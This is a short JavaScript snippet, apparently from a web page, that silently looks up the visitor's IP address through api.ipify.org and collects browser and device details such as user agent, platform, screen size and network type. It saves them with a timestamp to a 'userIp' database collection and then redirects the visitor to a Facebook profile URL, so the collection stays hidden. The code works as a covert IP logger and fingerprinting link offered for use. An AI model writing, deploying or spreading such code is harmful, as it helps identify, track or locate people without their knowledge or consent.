fetch('https://api.ipify.org/?format=json')
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip;
    const deviceInfo = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      networkeffectiveType: navigator.connection.effectiveType,
      networkdownlink: navigator.connection.downlink,
    };

    console.log(deviceInfo);

    db.collection("userIp").add({
        ipAddress, deviceInfo, time: new Date(),
    }).then(_ => {
        window.location.replace("http://www.facebook.com/profile.php?")
    });
  })
  .catch(error => {
    console.error(error);
  });
